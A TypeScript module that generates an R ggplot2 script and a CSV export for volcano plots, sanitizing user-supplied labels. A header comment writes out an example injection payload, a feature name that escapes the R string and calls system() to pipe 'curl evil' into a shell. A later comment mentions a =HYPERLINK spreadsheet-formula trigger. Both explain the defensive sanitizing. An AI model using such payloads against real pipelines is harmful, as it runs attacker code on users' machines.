// Pure string-builders for the Volcano tool. Emits a self-contained R
// script (ggplot2 flavour) that reproduces the plotted volcano from the
// user's data, plus a CSV export with the derived `class` column so the
// downstream user can re-run their own pipeline against Plöttr's
// classification.
//
// All user-supplied strings (feature labels, axis titles, plot title)
// flow through `sanitizeRString` (for quoted R literals) or
// `sanitizeRComment` (for `# ...` comment lines) — the audit-hardened
// helpers we shipped in `0ca44c6`. Without that, a hostile feature name
// like `"); system("curl evil|sh"); foo <- c("` would break out of the
// data.frame and execute arbitrary shell when the user runs the script.
//
// Consumes the global helpers (sanitizeRString, sanitizeRComment,
// formatRNumber) from shared.bundle.js the same way every other
// reports.ts does.

import { VolcanoPoint, VOLCANO_DEFAULT_COLORS, summarize } from "./helpers";

declare const sanitizeRString: (s: unknown) => string;
declare const sanitizeRComment: (s: unknown) => string;
declare const formatRNumber: (n: number | null | undefined) => string;

// Wrap a long c(...) literal across multiple indented lines so the
// script stays readable when the dataset has thousands of features.
// Mirrors the helper in shared-r-export.js (kept private there).
function wrapC(items: string[], perLine: number): string {
  const P = perLine || 8;
  if (items.length <= P) return "c(" + items.join(", ") + ")";
  const lines: string[] = [];
  for (let i = 0; i < items.length; i += P) {
    lines.push("    " + items.slice(i, i + P).join(", "));
  }
  return "c(\n" + lines.join(",\n") + "\n  )";
}

interface BuildVolcanoRScriptArgs {
  points: VolcanoPoint[];
  fcCutoff: number;
  pCutoff: number;
  colors: { up: string; down: string; ns: string };
  xLabel: string;
  yLabel: string;
  plotTitle: string;
  yIsAdjusted: boolean;
  generatedAt?: string;
}

export function buildVolcanoRScript(args: BuildVolcanoRScriptArgs): string {
  const { points, fcCutoff, pCutoff, colors, xLabel, yLabel, plotTitle, yIsAdjusted, generatedAt } =
    args;
  const now = generatedAt || new Date().toISOString().replace(/\.\d{3}Z$/, "Z");
  const summary = summarize(points, fcCutoff, pCutoff);

  // Build the three parallel vectors. Discarded rows (non-finite log2FC
  // or p) are dropped — the R reproduction shouldn't carry NA noise that
  // the Plöttr render also dropped.
  const featureItems: string[] = [];
  const log2fcItems: string[] = [];
  const pItems: string[] = [];
  for (const pt of points) {
    if (!Number.isFinite(pt.log2fc) || !Number.isFinite(pt.p)) continue;
    const labelStr =
      pt.label != null && pt.label !== ""
        ? '"' + sanitizeRString(pt.label) + '"'
        : '"feature_' + (pt.idx + 1) + '"';
    featureItems.push(labelStr);
    log2fcItems.push(formatRNumber(pt.log2fc));
    pItems.push(formatRNumber(pt.p));
  }

  const lines: string[] = [];
  lines.push("# -----------------------------------------------------------------------------");
  lines.push("# Plöttr — Volcano plot R script export");
  lines.push("# Generated: " + now);
  lines.push("#");
  lines.push("# Reproduces the volcano plot you saw in the browser tool, using ggplot2.");
  lines.push("# Each point is one feature. Classification:");
  lines.push(
    "#   up   : log2FC > +" + formatRNumber(fcCutoff) + " AND p < " + formatRNumber(pCutoff)
  );
  lines.push(
    "#   down : log2FC < -" + formatRNumber(fcCutoff) + " AND p < " + formatRNumber(pCutoff)
  );
  lines.push("#   ns   : everything else");
  lines.push(
    "# Y-axis is -log10(" +
      (yIsAdjusted ? "adjusted p-value" : "raw p-value") +
      ") — pick the column that matches your downstream pipeline."
  );
  lines.push("#");
  lines.push(
    "# Toolbox reported: up=" +
      summary.up +
      ", down=" +
      summary.down +
      ", ns=" +
      summary.ns +
      " (out of " +
      summary.total +
      " valid points; " +
      summary.discarded +
      " discarded for non-finite values)."
  );
  lines.push("# -----------------------------------------------------------------------------");
  lines.push("");
  lines.push('if (!requireNamespace("ggplot2", quietly = TRUE)) install.packages("ggplot2")');
  lines.push("library(ggplot2)");
  lines.push("");

  // ── Data frame literal ────────────────────────────────────────────
  lines.push("df <- data.frame(");
  lines.push("  feature = " + wrapC(featureItems, 6) + ",");
  lines.push("  log2FC  = " + wrapC(log2fcItems, 8) + ",");
  lines.push("  pvalue  = " + wrapC(pItems, 8) + ",");
  lines.push("  stringsAsFactors = FALSE");
  lines.push(")");
  lines.push("");

  // ── Derived columns ───────────────────────────────────────────────
  lines.push("# Clamp p = 0 to a finite floor (smallest non-zero / 10) so -log10 stays finite.");
  lines.push("p_floor <- min(df$pvalue[df$pvalue > 0], na.rm = TRUE) / 10");
  lines.push("df$nlog10p <- -log10(pmax(df$pvalue, p_floor))");
  lines.push("df$class <- with(df, ifelse(");
  lines.push(
    "  pvalue < " + formatRNumber(pCutoff) + " & log2FC >  " + formatRNumber(fcCutoff) + ', "up",'
  );
  lines.push("  ifelse(");
  lines.push(
    "    pvalue < " +
      formatRNumber(pCutoff) +
      " & log2FC < -" +
      formatRNumber(fcCutoff) +
      ', "down", "ns"'
  );
  lines.push("  )");
  lines.push("))");
  lines.push('df$class <- factor(df$class, levels = c("ns", "down", "up"))');
  lines.push("");

  // ── Plot ──────────────────────────────────────────────────────────
  lines.push(
    'plot_colors <- c(up = "' +
      colors.up +
      '", down = "' +
      colors.down +
      '", ns = "' +
      colors.ns +
      '")'
  );
  lines.push("");
  lines.push("ggplot(df, aes(x = log2FC, y = nlog10p, color = class)) +");
  lines.push("  geom_point(alpha = 0.7) +");
  lines.push(
    "  geom_vline(xintercept = c(-" +
      formatRNumber(fcCutoff) +
      ", " +
      formatRNumber(fcCutoff) +
      '), linetype = "dashed", color = "grey60") +'
  );
  lines.push(
    "  geom_hline(yintercept = -log10(" +
      formatRNumber(pCutoff) +
      '), linetype = "dashed", color = "grey60") +'
  );
  lines.push("  scale_color_manual(values = plot_colors) +");
  lines.push(
    '  labs(x = "' +
      sanitizeRString(xLabel || "log2(fold change)") +
      '", y = "' +
      sanitizeRString(yLabel || "-log10(p)") +
      '"' +
      (plotTitle ? ', title = "' + sanitizeRString(plotTitle) + '"' : "") +
      ") +"
  );
  lines.push("  theme_classic() +");
  lines.push('  theme(legend.position = "right")');
  lines.push("");

  return lines.join("\n");
}

// CSV export with the derived `class` column. Headers and per-feature
// labels both flow through buildCsvString's leading-trigger sanitiser
// (already applied at the shared layer), so a hostile label like
// `=HYPERLINK(...)` is neutralised on download — same path as every
// other tool's CSV export. Returns { headers, rows } shaped for
// downloadCsv.
export function buildVolcanoCsv(args: {
  points: VolcanoPoint[];
  fcCutoff: number;
  pCutoff: number;
  yIsAdjusted: boolean;
}): { headers: string[]; rows: string[][] } {
  const { points, fcCutoff, pCutoff, yIsAdjusted } = args;
  const headers = [
    "feature",
    "log2FC",
    yIsAdjusted ? "p_adjusted" : "p_value",
    "neg_log10_p",
    "class",
  ];
  const rows: string[][] = [];
  // Compute pFloor once to keep the exported -log10(p) consistent with
  // the chart.
  let minNonZero = Infinity;
  for (const pt of points) {
    if (Number.isFinite(pt.p) && pt.p > 0 && pt.p < minNonZero) minNonZero = pt.p;
  }
  const pFloor = Number.isFinite(minNonZero) ? minNonZero / 10 : 1e-300;
  for (const pt of points) {
    const safe = pt.p === 0 ? pFloor : pt.p;
    const nl = Number.isFinite(safe) && safe > 0 ? -Math.log10(safe) : "";
    let cls: string = "ns";
    if (Number.isFinite(pt.log2fc) && Number.isFinite(pt.p) && pt.p < pCutoff) {
      if (pt.log2fc > fcCutoff) cls = "up";
      else if (pt.log2fc < -fcCutoff) cls = "down";
    }
    if (!Number.isFinite(pt.log2fc) || !Number.isFinite(pt.p)) cls = "discarded";
    rows.push([
      pt.label != null ? pt.label : "feature_" + (pt.idx + 1),
      Number.isFinite(pt.log2fc) ? String(pt.log2fc) : "",
      Number.isFinite(pt.p) ? String(pt.p) : "",
      typeof nl === "number" ? String(nl) : "",
      cls,
    ]);
  }
  return { headers, rows };
}
